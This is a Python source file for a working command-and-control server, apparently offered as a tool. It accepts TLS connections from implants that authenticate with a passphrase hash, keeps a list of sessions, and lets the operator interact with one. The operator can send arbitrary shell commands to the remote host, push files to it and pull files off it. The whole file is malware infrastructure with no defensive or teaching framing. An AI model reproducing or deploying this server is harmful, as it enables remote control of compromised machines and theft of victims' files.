import socket, threading, os, sys, time, ssl, hashlib, readline

import json

with open("config.json", "r") as f:
    _cfg = json.load(f)

HOST = '0.0.0.0'
PORT = _cfg["port"]
PASSPHRASE_HASH = _cfg["passphrase_hash"]

MAX_AUTH_ATTEMPTS = 3
LOCKOUT_TIME = 60
failed_attempts = {}

BUFFER_SIZE = 4096
DOWNLOAD_DIR = "downloads"
UPLOAD_DIR = "uploads"
END_MARKER = b"__END__"

os.makedirs(DOWNLOAD_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)

class C:
    R   = '\033[91m'     # light red
    RD  = '\033[31m'     # dark red
    G   = '\033[92m'     # green
    CY  = '\033[96m'     # cyan
    CD  = '\033[36m'     # dark cyan
    W   = '\033[97m'     # white
    B   = '\033[1m'      # bold
    RST = '\033[0m'      # reset

P = "  "  

def red(t):    return f"{C.R}{t}{C.RST}"
def green(t):  return f"{C.G}{t}{C.RST}"
def cyan(t):   return f"{C.CY}{t}{C.RST}"
def white(t):  return f"{C.W}{C.B}{t}{C.RST}"
def err(t):    return f"{P}{C.R}{t}{C.RST}"
def ok(t):     return f"{P}{C.G}{t}{C.RST}"
def info(t):   return f"{P}{C.CY}{t}{C.RST}"


class C2Server:
    def __init__(self):
        self.clients = {}
        self.next_id = 1
        self.lock = threading.Lock()
        self.in_session = False

    def recv_until_end(self, sock):
        data = b""
        while True:
            chunk = sock.recv(BUFFER_SIZE)
            if not chunk:
                break
            data += chunk
            if data.endswith(END_MARKER):
                data = data[:-len(END_MARKER)]
                break
        return data.decode(errors='replace')

    def print_header(self):
        h = f"{HOST} : {PORT}"
        t = "SERVER C2"
        w = 32
        print()
        print(f"{P}{C.RD}\u2554{'═' * w}\u2557{C.RST}")
        print(f"{P}{C.RD}\u2551{C.RST}{white(t.center(w))}{C.RD}\u2551{C.RST}")
        print(f"{P}{C.RD}\u2551{C.RST}{cyan(h.center(w))}{C.RD}\u2551{C.RST}")
        print(f"{P}{C.RD}\u255a{'═' * w}\u255d{C.RST}")
        print()
        print(f"{P}{C.CD}Commands:{C.RST} {white('sessions')}  {white('interact <id>')}  {white('exit')}")
        print()

    def elapsed(self, t):
        s = int(time.time() - t)
        if s < 60:    return f"{s}s"
        if s < 3600:  return f"{s // 60}m"
        return f"{s // 3600}h{(s % 3600) // 60}m"

    def prompt(self):
        return f"{P}{C.R}{C.B}C2{C.RST} {C.CD}>{C.RST} "

    def session_prompt(self, ip):
        return f"{P}{C.R}{ip}{C.RST} {C.CD}>{C.RST} "

    def list_sessions(self):
        with self.lock:
            if not self.clients:
                print(err("No connected clients."))
                return
            print()
            print(f"{P}{C.CD}{'#':<4} {'IP':<18} {'CONNECTED FOR'}{C.RST}")
            print(f"{P}{C.CD}{'─' * 35}{C.RST}")
            for cid, (sock, addr, ct) in self.clients.items():
                print(f"{P}{white(str(cid) + '.')} {C.W}{addr[0]:<18}{C.RST} {cyan(self.elapsed(ct))}")
            print()

    def handle_client(self, client_socket, addr):
        try:
            ip = addr[0]
            now = time.time()

            if ip in failed_attempts:
                attempts, last_fail = failed_attempts[ip]
                if attempts >= MAX_AUTH_ATTEMPTS and (now - last_fail) < LOCKOUT_TIME:
                    client_socket.close()
                    return
                if (now - last_fail) >= LOCKOUT_TIME:
                    del failed_attempts[ip]

            client_socket = self.ssl_context.wrap_socket(client_socket, server_side=True)
            client_socket.settimeout(10)
            auth = client_socket.recv(1024).decode().strip()
            if hashlib.sha256(auth.encode()).hexdigest() != PASSPHRASE_HASH:
                if ip in failed_attempts:
                    failed_attempts[ip] = (failed_attempts[ip][0] + 1, now)
                else:
                    failed_attempts[ip] = (1, now)
                client_socket.close()
                return

            client_socket.settimeout(None)
            with self.lock:
                cid = self.next_id
                self.next_id += 1
                self.clients[cid] = (client_socket, addr, time.time())

            print(f"\n{ok(f'New connection: {addr[0]}')}")
            if not self.in_session:
                print(self.prompt(), end='', flush=True)

        except Exception:
            client_socket.close()
            return

    def remove_client(self, cid, sock):
        with self.lock:
            if cid in self.clients:
                del self.clients[cid]
        try:
            sock.close()
        except Exception:
            pass

    def interact(self, cid):
        with self.lock:
            if cid not in self.clients:
                print(err(f"Session {cid} not found."))
                return
            sock, addr, ct = self.clients[cid]

        ip = addr[0]
        self.in_session = True
        print(ok(f"Session opened: {ip}"))
        print()

        while True:
            try:
                cmd = input(self.session_prompt(ip)).strip()

                if not cmd:
                    continue

                if cmd.lower() == 'back':
                    print(info("Session suspended."))
                    break

                # --- Upload ---
                if cmd.lower().startswith('upload '):
                    parts = cmd.split(' ', 2)
                    if len(parts) < 2:
                        continue
                    local_file = parts[1]
                    remote_path = parts[2] if len(parts) > 2 else os.path.basename(local_file)

                    if not os.path.exists(local_file):
                        print(err("File not found."))
                        continue

                    sock.send(f"__UPLOAD__:{remote_path}".encode())
                    if sock.recv(BUFFER_SIZE).decode() == "READY":
                        with open(local_file, 'rb') as f: file_data = f.read()
                        local_hash = hashlib.sha256(file_data).hexdigest()
                        sock.send(f"SIZE:{len(file_data)}".encode())
                        if sock.recv(BUFFER_SIZE).decode() == "OK":
                            sock.send(file_data)
                            remote_hash = sock.recv(1024).decode()
                            if remote_hash == local_hash:
                                print(ok(f"Transfer complete (integrity verified): {remote_path}"))
                            else:
                                print(err(f"Transfer failed (hash mismatch): {remote_path}"))

                # --- Download ---
                elif cmd.lower().startswith('download '):
                    remote_file = cmd.split(' ', 1)[1]
                    sock.send(f"__DOWNLOAD__:{remote_file}".encode())
                    size_data = sock.recv(BUFFER_SIZE).decode()

                    if size_data.startswith("SIZE:"):
                        size = int(size_data.split(':')[1])
                        sock.send(b"OK")
                        local_path = os.path.join(DOWNLOAD_DIR, f"{ip}_{os.path.basename(remote_file)}")

                        file_data = b""
                        while len(file_data) < size:
                            data = sock.recv(min(BUFFER_SIZE, size - len(file_data)))
                            if not data: break
                            file_data += data
                        with open(local_path, 'wb') as f: f.write(file_data)
                        local_hash = hashlib.sha256(file_data).hexdigest()
                        sock.send(b"HASH_REQ")
                        remote_hash = sock.recv(1024).decode()
                        if remote_hash == local_hash:
                            print(ok(f"File saved (integrity verified): {local_path}"))
                        else:
                            print(err(f"File saved but integrity check failed: {local_path}"))

                
                else:
                    sock.send(cmd.encode())
                    response = self.recv_until_end(sock)
                    for line in response.splitlines():
                        print(f"{P}{line}")
                    print()

            except (ConnectionResetError, BrokenPipeError, OSError):
                print(err(f"Connection lost: {ip}"))
                self.remove_client(cid, sock)
                break
            except EOFError:
                break

        self.in_session = False

    def start(self):
        raw_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        raw_server.bind((HOST, PORT))
        raw_server.listen(5)

        self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.ssl_context.load_cert_chain(certfile="server.crt", keyfile="server.key")
        server = raw_server

        self.print_header()

        threading.Thread(target=self.accept_loop, args=(server,), daemon=True).start()
        self.main_loop()

    def accept_loop(self, server):
        while True:
            try:
                client, addr = server.accept()
                threading.Thread(target=self.handle_client, args=(client, addr), daemon=True).start()
            except Exception:
                break

    def main_loop(self):
        while True:
            try:
                cmd = input(self.prompt()).strip()

                if not cmd:
                    continue

                if cmd.lower() == 'sessions':
                    self.list_sessions()

                elif cmd.lower().startswith('interact '):
                    try:
                        cid = int(cmd.split(' ', 1)[1])
                        self.interact(cid)
                    except ValueError:
                        print(err("Usage: interact <id>"))

                elif cmd.lower() == 'exit':
                    print(info("Shutting down server."))
                    os._exit(0)

                else:
                    print(err(f"Unknown command: {cmd}"))

            except (KeyboardInterrupt, EOFError):
                print(f"\n{info('Shutting down server.')}")
                os._exit(0)


if __name__ == "__main__":
    c2 = C2Server()
    c2.start()